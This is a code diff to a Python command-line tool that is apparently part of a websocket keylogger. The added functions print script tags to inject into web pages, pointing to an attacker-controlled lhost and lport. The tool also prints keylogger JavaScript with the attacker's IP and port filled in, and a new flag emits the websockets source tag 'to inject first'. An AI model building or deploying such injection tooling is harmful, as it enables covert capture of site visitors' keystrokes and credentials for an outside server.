@@ -17,15 +17,20 @@ import json
 import sys
 
 from argparse import ArgumentParser
+from config import WEBSOCKETS_SOURCE, WSKEYLOGGER_SOURCE
+
+def print_ws_source():
+
+    print '<script type="text/javascript" src="%s"></script>' % WEBSOCKETS_SOURCE
 
 def print_wskeylogger_code(lhost, lport):
 
-    with open('wskeyloggerd/static/js/wsk.js') as fd:
+    with open(WSKEYLOGGER_SOURCE) as fd:
         print fd.read().replace('KEYBOARDSNITCH_IP', lhost).replace('KEYBOARDSNITCH_PORT', str(lport))
 
 def print_wskeylogger_tag(lhost, lport):
 
-    print 'http://%s:%d/wsk' % (lhost, lport)
+    print '<script type="text/javascript" src="http://%s:%s/"></script>' % (lhost, lport)
 
 def run_wizard():
 
@@ -148,6 +153,12 @@ def set_configs():
                     required=False,
                     help='Get keylogger code to inject into webpage.')
 
+    parser.add_argument('--ws-source',
+                    dest='ws_source',
+                    action='store_true',
+                    required=False,
+                    help='Get websockets source tag (inject this first).')
+
     parser.add_argument('--inject-tag',
                     dest='inject_tag',
                     action='store_true',
@@ -159,7 +170,13 @@ def set_configs():
 
     if args.wizard:
         return run_wizard()
+    elif args.ws_source:
+        print_ws_source()
+        sys.exit(0)
     elif args.lport is None or args.lhost is None:
+        parser.print_help()
+        print
+        print '--lport and --lhost are mandatory flags unless the --wizard or --ws-source flags are in use'
         sys.exit(1)
     elif args.inject_tag:
         print_wskeylogger_tag(args.lhost, args.lport)
